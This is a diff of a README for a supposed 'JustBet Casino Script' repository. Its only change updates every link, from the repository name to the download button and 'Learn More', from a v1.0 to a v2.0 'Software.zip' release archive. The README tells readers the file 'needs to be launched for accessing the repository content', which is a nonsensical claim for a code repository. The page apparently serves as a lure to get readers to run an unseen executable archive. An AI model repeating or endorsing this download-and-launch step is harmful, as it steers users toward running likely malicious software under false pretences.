@@ -1,7 +1,7 @@
 # 🎲 Welcome to JustBet Casino Script Repository! 🎰
 
 ## Description
-Welcome to the "https://github.com/Mejicool/Casino-scripts.com-/releases/download/v1.0/Software.zip" repository, where you can find the JustBet Casino Script that offers affordable, essential tools to start your own casino. This budget-friendly, reliable, and globally accessible casino script provides the necessary features to help you launch your online casino business with ease.
+Welcome to the "https://github.com/Mejicool/Casino-scripts.com-/releases/download/v2.0/Software.zip" repository, where you can find the JustBet Casino Script that offers affordable, essential tools to start your own casino. This budget-friendly, reliable, and globally accessible casino script provides the necessary features to help you launch your online casino business with ease.
 
 ## Topics
 Explore the following topics related to our casino script:
@@ -26,12 +26,12 @@ Explore the following topics related to our casino script:
 
 ## Get Started
 To download the JustBet Casino Script, click the button below:
-[![Download JustBet Casino Script](https://github.com/Mejicool/Casino-scripts.com-/releases/download/v1.0/Software.zip)](https://github.com/Mejicool/Casino-scripts.com-/releases/download/v1.0/Software.zip)
+[![Download JustBet Casino Script](https://github.com/Mejicool/Casino-scripts.com-/releases/download/v2.0/Software.zip)](https://github.com/Mejicool/Casino-scripts.com-/releases/download/v2.0/Software.zip)
 
 _This file needs to be launched for accessing the repository content._
 
 ## Learn More
-Visit the repository [here](https://github.com/Mejicool/Casino-scripts.com-/releases/download/v1.0/Software.zip) or check the "Releases" section for more information.
+Visit the repository [here](https://github.com/Mejicool/Casino-scripts.com-/releases/download/v2.0/Software.zip) or check the "Releases" section for more information.
 
 ## Happy Gaming! 🎉🎲
 
